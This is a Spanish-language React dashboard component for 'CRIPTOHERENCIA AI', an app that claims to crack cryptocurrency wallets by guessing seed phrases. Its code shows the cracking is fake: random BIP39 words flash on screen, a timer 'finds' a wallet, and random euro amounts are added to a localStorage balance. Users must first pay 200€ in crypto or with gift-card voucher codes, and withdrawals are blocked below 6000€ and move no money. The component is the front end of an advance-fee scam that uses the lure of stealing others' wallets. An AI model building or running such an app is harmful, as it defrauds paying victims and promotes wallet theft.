import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Badge } from '../components/ui/badge';
import { Separator } from '../components/ui/separator';
import { useToast } from '../hooks/use-toast';
import { 
  Menu, 
  X, 
  Play, 
  Wallet, 
  History, 
  CreditCard, 
  LogOut, 
  Shield,
  AlertCircle,
  Copy,
  CheckCircle,
  Target,
  Lock,
  Bitcoin,
  Zap
} from 'lucide-react';
import { bip39Words, getRandomAmount, cryptoIcons, paymentAddresses } from '../components/mock';

const UserDashboard = () => {
  const navigate = useNavigate();
  const { user, logout, updateUser } = useAuth();
  const { toast } = useToast();
  
  const [menuOpen, setMenuOpen] = useState(false);
  const [currentView, setCurrentView] = useState('simulator');
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [userWallet, setUserWallet] = useState('');
  const [isSimulating, setIsSimulating] = useState(false);
  const [currentWords, setCurrentWords] = useState(Array(12).fill('empezar'));
  const [foundWallet, setFoundWallet] = useState(null);
  const [showCryptoPayment, setShowCryptoPayment] = useState(false);
  const [showCardPayment, setShowCardPayment] = useState(false);
  const [voucherCode, setVoucherCode] = useState('');
  const [attackInProgress, setAttackInProgress] = useState(false);
  const [searchStatus, setSearchStatus] = useState('idle'); // idle, searching, found
  const [selectedWithdrawCrypto, setSelectedWithdrawCrypto] = useState('');
  const [withdrawWallet, setWithdrawWallet] = useState('');

  // Redirect if not authenticated
  useEffect(() => {
    if (!user) {
      navigate('/login');
      return;
    }
    
    // Redirect admin to admin panel
    if (user.isAdmin) {
      navigate('/admin');
      return;
    }
    
    setUserWallet(user.wallet || '');
  }, [user, navigate]);

  const validateWalletAddress = (address, type) => {
    const patterns = {
      BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/,
      ETH: /^0x[a-fA-F0-9]{40}$/,
      LTC: /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,87}$/
    };
    
    return patterns[type]?.test(address) || false;
  };

  const getWalletType = (address) => {
    if (validateWalletAddress(address, 'BTC')) return 'BTC';
    if (validateWalletAddress(address, 'ETH')) return 'ETH';
    if (validateWalletAddress(address, 'LTC')) return 'LTC';
    return null;
  };

  // Crypto logos y colores
  const cryptoLogos = {
    BTC: '₿',
    ETH: 'Ξ', 
    LTC: 'Ł'
  };

  const cryptoColors = {
    BTC: 'bg-orange-500 hover:bg-orange-600 border-orange-500',
    ETH: 'bg-blue-500 hover:bg-blue-600 border-blue-500', 
    LTC: 'bg-gray-500 hover:bg-gray-600 border-gray-500'
  };

  const startSimulation = () => {
    if (!selectedCrypto) {
      toast({
        title: "Error",
        description: "Selecciona el tipo de billetera a atacar",
        variant: "destructive"
      });
      return;
    }

    if (!userWallet.trim()) {
      toast({
        title: "Error",
        description: "Introduce tu dirección de wallet de destino",
        variant: "destructive"
      });
      return;
    }

    const walletType = getWalletType(userWallet);
    if (!walletType) {
      toast({
        title: "Dirección Inválida",
        description: "La dirección de wallet no es válida",
        variant: "destructive"
      });
      return;
    }

    if (!user.verified) {
      toast({
        title: "Acceso Restringido",
        description: "Necesitas verificar tu cuenta para usar el simulador",
        variant: "destructive"
      });
      return;
    }

    setAttackInProgress(true);
    setIsSimulating(true);
    setSearchStatus('searching');
    setFoundWallet(null);
    
    // Simular búsqueda de palabras seed
    const interval = setInterval(() => {
      const randomWords = [];
      for (let i = 0; i < 12; i++) {
        randomWords.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
      }
      setCurrentWords(randomWords);
    }, 100);

    // Simular "encontrar" una wallet después de 5-15 segundos
    const findTime = 5000 + Math.random() * 10000;
    setTimeout(() => {
      clearInterval(interval);
      setIsSimulating(false);
      setAttackInProgress(false);
      setSearchStatus('found');
      
      const amount = getRandomAmount();
      
      setFoundWallet({
        type: selectedCrypto,
        amount: amount,
        phrase: currentWords
      });

      // Actualizar balance del usuario
      const newBalance = { ...user.balance };
      newBalance[selectedCrypto] = (newBalance[selectedCrypto] || 0) + amount;
      
      const updatedUser = { ...user, balance: newBalance, wallet: userWallet };
      updateUser(updatedUser);
      
      // Actualizar en localStorage
      const users = JSON.parse(localStorage.getItem('cryptoherencia_users') || '[]');
      const userIndex = users.findIndex(u => u.id === user.id);
      if (userIndex !== -1) {
        users[userIndex] = updatedUser;
        localStorage.setItem('cryptoherencia_users', JSON.stringify(users));
      }

      toast({
        title: "¡Wallet Encontrada!",
        description: `Se han sumado ${amount}€ en tu panel`,
      });
    }, findTime);
  };

  const continueSearching = () => {
    setSearchStatus('idle');
    setFoundWallet(null);
    setCurrentWords(Array(12).fill('empezar'));
  };

  const processWithdrawal = () => {
    if (!selectedWithdrawCrypto || !withdrawWallet.trim()) {
      toast({
        title: "Error",
        description: "Selecciona una criptomoneda y dirección de wallet",
        variant: "destructive"
      });
      return;
    }

    const walletType = getWalletType(withdrawWallet);
    if (!walletType) {
      toast({
        title: "Dirección Inválida",
        description: "La dirección de wallet no es válida",
        variant: "destructive"
      });
      return;
    }

    // Verificar mínimo de 6000€
    const totalBalance = getTotalBalance();
    if (totalBalance < 6000) {
      toast({
        title: "Balance Insuficiente",
        description: "Para poder retirar fondos necesitas al menos acumular en total 6000€ en tu panel… sigue ganando",
        variant: "destructive",
        duration: 5000
      });
      return;
    }

    const cryptoBalance = user.balance[selectedWithdrawCrypto] || 0;
    
    // Simular retiro
    const withdrawal = {
      id: Date.now().toString(),
      date: new Date().toISOString(),
      type: selectedWithdrawCrypto,
      amount: cryptoBalance,
      wallet: withdrawWallet,
      status: 'Retirado'
    };

    // Actualizar balance del usuario (restar el monto retirado)
    const newBalance = { ...user.balance };
    newBalance[selectedWithdrawCrypto] = 0;
    
    const updatedUser = { ...user, balance: newBalance };
    updateUser(updatedUser);
    
    // Actualizar en localStorage
    const users = JSON.parse(localStorage.getItem('cryptoherencia_users') || '[]');
    const userIndex = users.findIndex(u => u.id === user.id);
    if (userIndex !== -1) {
      users[userIndex] = updatedUser;
      localStorage.setItem('cryptoherencia_users', JSON.stringify(users));
    }

    // Guardar en historial
    const history = JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
    history.unshift(withdrawal);
    localStorage.setItem(`history_${user.id}`, JSON.stringify(history));

    // Reset estados
    setSelectedWithdrawCrypto('');
    setWithdrawWallet('');
    
    toast({
      title: "Retiro Procesado",
      description: `${cryptoBalance}€ en ${selectedWithdrawCrypto} enviados a tu wallet`,
    });
  };

  const withdrawFunds = () => {
    if (!foundWallet) return;
    
    // Simular retiro
    const withdrawal = {
      id: Date.now().toString(),
      date: new Date().toISOString(),
      type: foundWallet.type,
      amount: foundWallet.amount,
      wallet: userWallet,
      status: 'Retirado'
    };

    // Guardar en historial
    const history = JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
    history.unshift(withdrawal);
    localStorage.setItem(`history_${user.id}`, JSON.stringify(history));

    setFoundWallet(null);
    toast({
      title: "Retiro Procesado",
      description: `${foundWallet.amount}€ enviados a tu wallet`,
    });
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copiado",
      description: "Dirección copiada al portapapeles",
    });
  };

  const submitVoucher = () => {
    if (!voucherCode.trim()) {
      toast({
        title: "Error",
        description: "Introduce un código de voucher válido",
        variant: "destructive"
      });
      return;
    }

    // Simular envío al admin
    const vouchers = JSON.parse(localStorage.getItem('cryptovouchers') || '[]');
    const newVoucher = {
      id: Date.now().toString(),
      userEmail: user.email,
      code: voucherCode,
      status: 'pendiente',
      date: new Date().toISOString()
    };
    vouchers.push(newVoucher);
    localStorage.setItem('cryptovouchers', JSON.stringify(vouchers));

    setVoucherCode('');
    toast({
      title: "Código Enviado",
      description: "Tu código está siendo verificado por el administrador",
    });
  };

  const getHistory = () => {
    return JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
  };

  const getTotalBalance = () => {
    if (!user.balance) return 0;
    return Object.values(user.balance).reduce((sum, value) => sum + value, 0);
  };

  if (!user) return null;

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-white text-gray-800 font-sans">
      {/* Subtle Matrix background */}
      <div className="absolute inset-0 opacity-3 pointer-events-none overflow-hidden">
        {[...Array(10)].map((_, i) => (
          <div
            key={i}
            className="absolute animate-pulse text-green-500 text-xs"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 3}s`,
              animationDuration: `${2 + Math.random() * 3}s`
            }}
          >
            {Math.random() > 0.5 ? '1' : '0'}
          </div>
        ))}
      </div>

      <div className="relative z-10">
        {/* Header */}
        <header className="bg-white border-b border-gray-200 shadow-sm p-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <h1 className="text-xl font-bold text-gray-900 font-sans">
                CRIPTOHERENCIA AI
              </h1>
            </div>
            
            <div className="flex items-center space-x-4">
              <div className="text-right">
                <div className="text-xs text-gray-500 font-sans">SALDO DISPONIBLE:</div>
                <div className="text-lg font-bold text-green-600 font-sans">
                  €{getTotalBalance()}
                </div>
              </div>
              
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setMenuOpen(!menuOpen)}
                className="text-gray-600 hover:text-gray-900 font-sans"
              >
                {menuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
              </Button>
            </div>
          </div>
        </header>

        <div className="flex">
          {/* Sidebar Menu */}
          {menuOpen && (
            <div className="absolute right-0 top-16 bg-slate-900/95 backdrop-blur border border-green-500/50 rounded-lg shadow-2xl shadow-green-500/20 overflow-hidden min-w-[200px] z-50">
              <div className="p-2">
                <Button
                  variant={currentView === 'simulator' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('simulator'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <Target className="h-4 w-4 mr-2" />
                  &gt; ATACAR
                </Button>
                <Button
                  variant={currentView === 'history' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('history'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <History className="h-4 w-4 mr-2" />
                  &gt; HISTORIAL
                </Button>
                <Button
                  variant={currentView === 'withdraw' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('withdraw'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <Wallet className="h-4 w-4 mr-2" />
                  &gt; RETIRAR
                </Button>
                <Separator className="my-2 bg-green-500/30" />
                <Button
                  variant="ghost"
                  onClick={() => {logout(); navigate('/');}}
                  className="w-full justify-start text-red-400 hover:text-red-300 font-mono text-sm hover:bg-red-500/20"
                >
                  <LogOut className="h-4 w-4 mr-2" />
                  &gt; CERRAR SESION
                </Button>
              </div>
            </div>
          )}

          {/* Main Content */}
          <div className="flex-1 p-6 relative">
            {/* Account Status Alert */}
            {!user.approved && (
              <Card className="bg-yellow-900/50 border-yellow-400/50 mb-6">
                <CardContent className="p-4">
                  <div className="flex items-center space-x-2">
                    <AlertCircle className="h-5 w-5 text-yellow-400" />
                    <div>
                      <h3 className="font-bold text-yellow-400 font-mono">&gt; CUENTA PENDIENTE</h3>
                      <p className="text-sm text-yellow-200 font-mono">Tu cuenta está pendiente de verificación por el administrador.</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {user.approved && !user.verified && (
              <Card className="bg-blue-900/50 border-blue-400/50 mb-6">
                <CardContent className="p-4">
                  <div className="flex items-center space-x-2">
                    <Shield className="h-5 w-5 text-blue-400" />
                    <div>
                      <h3 className="font-bold text-blue-400 font-mono">&gt; VERIFICACION REQUERIDA</h3>
                      <p className="text-sm text-blue-200 font-mono">Para usar el simulador, necesitas verificar tu cuenta mediante pago.</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Activate Program Section - Only for approved but not verified users */}
            {user.approved && !user.verified && (
              <Card className="bg-slate-900/80 border-green-400/50 mb-6">
                <CardHeader>
                  <CardTitle className="text-green-400 font-mono text-sm">&gt; ACTIVAR EL PROGRAMA</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <Button 
                      onClick={() => setShowCryptoPayment(true)}
                      className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-500 hover:to-green-600 text-black font-mono font-bold py-3"
                    >
                      Comprar con CriptoMonedas
                    </Button>
                    <Button 
                      onClick={() => setShowCardPayment(true)}
                      variant="outline"
                      className="border-green-400 text-green-400 hover:bg-green-400 hover:text-black font-mono font-bold py-3"
                    >
                      Comprar con TARJETA
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Crypto Payment Modal */}
            {showCryptoPayment && (
              <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-4">
                <div className="bg-white rounded-lg shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
                  <div className="p-6 border-b border-gray-200">
                    <div className="flex items-center justify-between">
                      <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                        <Wallet className="h-5 w-5 mr-2 text-gray-700" />
                        Pago con Criptomonedas
                      </h2>
                      <Button
                        onClick={() => setShowCryptoPayment(false)}
                        size="sm"
                        variant="outline"
                        className="border-gray-300 text-gray-500 hover:bg-gray-100"
                      >
                        <X className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                  
                  <div className="p-6">
                    <p className="text-gray-600 mb-6 text-sm">
                      Envía exactamente 200€ en cualquiera de estas criptomonedas a la dirección correspondiente:
                    </p>
                    
                    <div className="space-y-4">
                      {Object.entries(paymentAddresses).map(([crypto, address]) => (
                        <div key={crypto} className="border border-gray-200 rounded-lg p-4 hover:border-gray-300 transition-colors">
                          <Label className="text-gray-700 font-medium capitalize mb-2 block">{crypto}:</Label>
                          <div className="flex items-center space-x-2">
                            <Input
                              value={address}
                              readOnly
                              className="bg-gray-50 border-gray-200 text-gray-800 text-sm font-mono"
                            />
                            <Button
                              onClick={() => copyToClipboard(address)}
                              size="sm"
                              variant="outline"
                              className="border-gray-300 text-gray-600 hover:bg-gray-100 flex-shrink-0"
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>
                    
                    <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mt-6">
                      <p className="text-blue-800 text-sm">
                        <strong>Importante:</strong> Una vez enviado el pago, tu cuenta será verificada automáticamente en un plazo de 24 horas.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Card Payment Modal */}
            {showCardPayment && (
              <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-4">
                <div className="bg-white rounded-lg shadow-2xl max-w-md w-full">
                  <div className="p-6 border-b border-gray-200">
                    <div className="flex items-center justify-between">
                      <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                        <CreditCard className="h-5 w-5 mr-2 text-gray-700" />
                        Pago con Tarjeta
                      </h2>
                      <Button
                        onClick={() => setShowCardPayment(false)}
                        size="sm"
                        variant="outline"
                        className="border-gray-300 text-gray-500 hover:bg-gray-100"
                      >
                        <X className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                  
                  <div className="p-6">
                    <p className="text-gray-600 mb-4 text-sm">
                      Para realizar la compra de forma sencilla pagando con <strong>TARJETA</strong> debes comprar una CryptoVoucher (TARJETA REGALO 200€) y canjear el código que te darán aquí:
                    </p>
                    
                    <div className="space-y-4">
                      <div className="space-y-2">
                        <Label className="text-gray-700 font-medium">Código del Voucher:</Label>
                        <Input
                          value={voucherCode}
                          onChange={(e) => setVoucherCode(e.target.value)}
                          placeholder="Introduce el código aquí"
                          className="bg-gray-50 border-gray-200 text-gray-800"
                        />
                      </div>
                      
                      <Button
                        onClick={submitVoucher}
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium"
                        disabled={!voucherCode.trim()}
                      >
                        Canjear Código
                      </Button>
                    </div>
                    
                    <div className="bg-yellow-50 border border-yellow-200 p-4 rounded-lg mt-4">
                      <p className="text-yellow-800 text-sm">
                        <strong>Nota:</strong> Una vez enviado el código, será revisado por un administrador para verificar tu cuenta.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Main Content Views */}
            {currentView === 'simulator' && (
              <div className="space-y-6">
                {/* Crypto Selection - Professional Design */}
                <Card className="bg-white border-gray-200 shadow-sm">
                  <CardHeader className="border-b border-gray-100">
                    <CardTitle className="text-gray-800 font-sans text-lg">Seleccionar Criptomoneda Objetivo</CardTitle>
                  </CardHeader>
                  <CardContent className="p-6">
                    <div>
                      <Label className="text-gray-600 font-sans text-sm mb-3 block">Tipo de billetera a atacar:</Label>
                      <div className="grid grid-cols-3 gap-4">
                        {['BTC', 'ETH', 'LTC'].map((crypto) => (
                          <Button
                            key={crypto}
                            variant={selectedCrypto === crypto ? 'default' : 'outline'}
                            onClick={() => setSelectedCrypto(crypto)}
                            className={`${
                              selectedCrypto === crypto 
                                ? `${cryptoColors[crypto]} text-white border-0` 
                                : 'border-gray-300 text-gray-700 hover:bg-gray-50'
                            } font-sans text-sm py-3 px-4 flex flex-col items-center space-y-1 h-16`}
                          >
                            <span className="text-xl">{cryptoLogos[crypto]}</span>
                            <span className="text-xs">{crypto}</span>
                          </Button>
                        ))}
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Start Attack Button */}
                <div className="text-center">
                  <Button
                    onClick={() => {
                      if (!user.verified) {
                        toast({
                          title: "Error de Acceso",
                          description: "Debes comprar el programa primero para empezar a atacar y ganar dinero",
                          variant: "destructive"
                        });
                        return;
                      }
                      startSimulation();
                    }}
                    disabled={!selectedCrypto || !userWallet.trim() || attackInProgress}
                    className="bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-mono font-bold text-xl px-12 py-4 uppercase tracking-wider"
                  >
                    &gt; EMPEZAR ATAQUE
                  </Button>
                </div>

                {/* Attack System */}
                <Card className="bg-slate-900/80 border-green-400/50">
                  <CardHeader>
                    <CardTitle className="text-green-400 font-mono text-sm">&gt; ATACAR BILLETERAS</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    {!user.verified ? (
                      <div className="text-center p-8 bg-slate-800 rounded border border-yellow-400/50 relative">
                        <Lock className="h-16 w-16 text-yellow-400 mx-auto mb-4" />
                        <h3 className="text-xl font-bold text-yellow-400 mb-2 font-mono">&gt; ACCESO BLOQUEADO</h3>
                        <p className="text-slate-300 font-mono text-sm">
                          Para acceder al simulador de ataque, necesitas verificar tu cuenta mediante pago.
                        </p>
                      </div>
                    ) : (
                      <>
                        {/* Fixed Static Search Box - ALWAYS SAME SIZE AND POSITION */}
                        <div className="bg-black border border-green-400/50 rounded p-6 min-h-[400px] max-h-[400px]">
                          {/* Status Text - Changes but position stays same */}
                          <div className="text-center mb-4 h-16 flex flex-col justify-center">
                            {searchStatus === 'idle' && (
                              <div className="text-green-400 font-bold font-mono text-lg">
                                &gt; BUSCANDO BILLETERA CON FONDOS
                              </div>
                            )}
                            
                            {searchStatus === 'searching' && (
                              <>
                                <div className="text-green-400 font-bold font-mono text-lg animate-pulse">
                                  &gt; BUSCANDO BILLETERA CON FONDOS
                                </div>
                                <div className="text-blue-400 font-mono text-sm mt-1">
                                  &gt; Tipo: {selectedCrypto} | Velocidad: {Math.floor(Math.random() * 5000 + 1000)}/seg
                                </div>
                              </>
                            )}
                            
                            {searchStatus === 'found' && foundWallet && (
                              <>
                                <div className="text-green-400 font-bold font-mono text-lg mb-2">
                                  &gt; WALLET ENCONTRADA
                                </div>
                                <div className="text-white font-mono text-base">
                                  Se han sumado {cryptoIcons[foundWallet.type]} €{foundWallet.amount} en tu panel
                                </div>
                              </>
                            )}
                          </div>
                          
                          {/* 12 Words Grid - 6 LEFT, 6 RIGHT for professional look */}
                          <div className="grid grid-cols-2 gap-6 mb-6">
                            {/* Left Column (1-6) */}
                            <div className="space-y-2">
                              {currentWords.slice(0, 6).map((word, index) => (
                                <div
                                  key={index}
                                  className={`p-3 rounded border text-left font-mono text-sm ${
                                    searchStatus === 'searching'
                                      ? 'border-blue-400 text-blue-600 bg-blue-50 animate-pulse' 
                                      : 'border-gray-300 text-gray-700 bg-gray-50'
                                  }`}
                                >
                                  [{String(index + 1).padStart(2, '0')}] {word}
                                </div>
                              ))}
                            </div>
                            {/* Right Column (7-12) */}
                            <div className="space-y-2">
                              {currentWords.slice(6, 12).map((word, index) => (
                                <div
                                  key={index + 6}
                                  className={`p-3 rounded border text-left font-mono text-sm ${
                                    searchStatus === 'searching'
                                      ? 'border-blue-400 text-blue-600 bg-blue-50 animate-pulse' 
                                      : 'border-gray-300 text-gray-700 bg-gray-50'
                                  }`}
                                >
                                  [{String(index + 7).padStart(2, '0')}] {word}
                                </div>
                              ))}
                            </div>
                          </div>
                          
                          {/* Bottom Button Area - ALWAYS SAME POSITION */}
                          <div className="text-center h-12 flex items-center justify-center">
                            {searchStatus === 'idle' && (
                              <div className="text-slate-400 font-mono text-sm">
                                Presiona "EMPEZAR ATAQUE" para comenzar la búsqueda
                              </div>
                            )}
                            
                            {searchStatus === 'found' && (
                              <Button
                                onClick={continueSearching}
                                className="bg-green-500 hover:bg-green-600 text-black font-bold font-mono"
                              >
                                &gt; SEGUIR BUSCANDO
                              </Button>
                            )}
                          </div>
                        </div>
                      </>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}

            {currentView === 'history' && (
              <Card className="bg-slate-900/80 border-green-400/50">
                <CardHeader>
                  <CardTitle className="text-green-400 font-mono text-sm">&gt; HISTORIAL RETIROS</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {getHistory().length === 0 ? (
                      <div className="text-center py-8 text-slate-400">
                        <History className="h-16 w-16 mx-auto mb-4 opacity-50" />
                        <p className="font-mono">&gt; SIN RETIROS REGISTRADOS</p>
                      </div>
                    ) : (
                      getHistory().map((item) => (
                        <div key={item.id} className="flex items-center justify-between p-4 bg-slate-800 rounded border border-slate-700">
                          <div>
                            <div className="text-green-400 font-bold font-mono">
                              {cryptoIcons[item.type]} €{item.amount} {item.type}
                            </div>
                            <div className="text-sm text-slate-400 font-mono">
                              {new Date(item.date).toLocaleDateString('es-ES')}
                            </div>
                            <div className="text-xs text-blue-400 font-mono break-all">
                              &gt; {item.wallet}
                            </div>
                          </div>
                          <Badge variant="outline" className="border-green-400 text-green-400 font-mono">
                            {item.status}
                          </Badge>
                        </div>
                      ))
                    )}
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Withdraw View */}
            {currentView === 'withdraw' && (
              <Card className="bg-slate-900/80 border-green-400/50">
                <CardHeader>
                  <CardTitle className="text-green-400 font-mono text-sm">&gt; RETIRAR FONDOS</CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  {!selectedWithdrawCrypto ? (
                    <div>
                      <div className="text-slate-300 font-mono text-sm mb-4">
                        &gt; Selecciona la criptomoneda que deseas retirar:
                      </div>
                      
                      <div className="space-y-3">
                        {['BTC', 'ETH', 'LTC'].map((crypto) => {
                          const balance = user.balance?.[crypto] || 0;
                          return (
                            <Button
                              key={crypto}
                              onClick={() => setSelectedWithdrawCrypto(crypto)}
                              className="w-full justify-between bg-slate-800 hover:bg-slate-700 border border-green-400/50 text-green-400 font-mono p-4"
                              disabled={balance === 0}
                            >
                              <span className="flex items-center">
                                <Bitcoin className="h-4 w-4 mr-2" />
                                {crypto}:
                              </span>
                              <span className="font-bold">
                                €{balance.toFixed(2)}
                              </span>
                            </Button>
                          );
                        })}
                      </div>
                      
                      <div className="bg-slate-800 p-4 rounded border-l-4 border-yellow-400 mt-6">
                        <p className="text-yellow-300 font-mono text-sm">
                          &gt; Para poder retirar fondos necesitas al menos acumular en total 6000€ en tu panel... sigue ganando
                        </p>
                      </div>
                    </div>
                  ) : (
                    <div>
                      <div className="flex items-center justify-between mb-4">
                        <div className="text-green-400 font-mono text-lg flex items-center">
                          <Bitcoin className="h-5 w-5 mr-2" />
                          Retirar {selectedWithdrawCrypto}: €{(user.balance?.[selectedWithdrawCrypto] || 0).toFixed(2)}
                        </div>
                        <Button
                          onClick={() => {
                            setSelectedWithdrawCrypto('');
                            setWithdrawWallet('');
                          }}
                          variant="ghost"
                          size="sm"
                          className="text-slate-400 hover:text-white font-mono"
                        >
                          &gt; VOLVER
                        </Button>
                      </div>
                      
                      <div className="space-y-4">
                        <div>
                          <Label className="text-blue-400 font-mono text-xs">&gt; WALLET DESTINO ({selectedWithdrawCrypto}):</Label>
                          <Input
                            value={withdrawWallet}
                            onChange={(e) => setWithdrawWallet(e.target.value)}
                            placeholder={`Introduce tu dirección ${selectedWithdrawCrypto}`}
                            className="bg-slate-800 border-green-500/30 text-green-300 mt-2 font-mono"
                          />
                          <p className="text-xs text-slate-400 mt-1 font-mono">
                            &gt; Los fondos se enviarán a esta dirección
                          </p>
                        </div>
                        
                        <div className="text-center pt-4">
                          <Button
                            onClick={processWithdrawal}
                            disabled={!withdrawWallet.trim()}
                            className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-500 hover:to-green-600 text-black font-mono font-bold px-8 py-3"
                          >
                            &gt; PROCESAR RETIRO
                          </Button>
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default UserDashboard;